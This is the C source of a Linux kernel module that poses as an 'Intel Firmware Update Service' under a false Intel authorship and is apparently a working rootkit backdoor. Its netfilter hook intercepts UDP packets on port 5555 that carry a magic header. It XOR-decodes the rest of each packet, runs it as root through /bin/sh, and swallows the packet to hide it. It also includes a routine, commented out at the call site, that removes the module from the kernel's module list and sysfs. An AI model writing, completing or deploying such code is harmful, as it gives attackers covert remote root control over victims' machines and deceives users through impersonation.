#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/skbuff.h>

#define LISTEN_PORT 5555
#define MAGIC_HEADER "INTLUPD:"
#define MAGIC_LEN 8
#define XOR_KEY 0x55

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Intel Corporation");
MODULE_DESCRIPTION("Intel Firmware Update Service");
MODULE_VERSION("1.1");
MODULE_ALIAS("intel_fw_update");

static struct nf_hook_ops nfho;

struct exec_work {
    struct work_struct work;
    char *cmd;
};

static void hide_module(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    kobject_put(&THIS_MODULE->mkobj.kobj);

    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;
    THIS_MODULE->mkobj.drivers_dir = NULL;
}

static void run_command_work(struct work_struct *work)
{
    struct exec_work *ew = container_of(work, struct exec_work, work);
    char *argv[] = { "/bin/sh", "-c", ew->cmd, NULL };
    static char *envp[] = {
        "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    kfree(ew->cmd);
    kfree(ew);
}

static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    char *payload;
    unsigned int len;
    struct exec_work *ew;
    char *cmd;

    if (!skb || !skb->data)
        return NF_ACCEPT;

    if (!pskb_may_pull(skb, sizeof(struct iphdr) + sizeof(struct udphdr)))
        return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    if (ip_header->protocol != IPPROTO_UDP)
        return NF_ACCEPT;

    udp_header = udp_hdr(skb);
    if (ntohs(udp_header->dest) != LISTEN_PORT)
        return NF_ACCEPT;

    if (skb_linearize(skb) != 0)
        return NF_ACCEPT;

    payload = (char *)((unsigned char *)udp_header + sizeof(struct udphdr));
    len = ntohs(udp_header->len) - sizeof(struct udphdr);

    if (len < MAGIC_LEN + 1 || len > 1024)
        return NF_ACCEPT;

    if (memcmp(payload, MAGIC_HEADER, MAGIC_LEN) != 0)
        return NF_ACCEPT;

    payload += MAGIC_LEN;
    len -= MAGIC_LEN;

    cmd = kmalloc(len + 1, GFP_ATOMIC);
    if (!cmd) return NF_ACCEPT;

    memcpy(cmd, payload, len);
    for (unsigned int i = 0; i < len; i++)
        cmd[i] ^= XOR_KEY;

    cmd[len] = '\0';

    ew = kmalloc(sizeof(*ew), GFP_ATOMIC);
    if (!ew) {
        kfree(cmd);
        return NF_ACCEPT;
    }

    INIT_WORK(&ew->work, run_command_work);
    ew->cmd = cmd;
    schedule_work(&ew->work);

    kfree_skb(skb);  // Hide the packet
    return NF_STOLEN;
}

static int __init intel_fw_update_init(void)
{
    nfho.hook = hook_func;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = INT_MIN;

    nf_register_net_hook(&init_net, &nfho);
    // hide_module();  // Temporarily commented out to test loading
    return 0;
}

static void __exit intel_fw_update_exit(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
}

module_init(intel_fw_update_init);
module_exit(intel_fw_update_exit);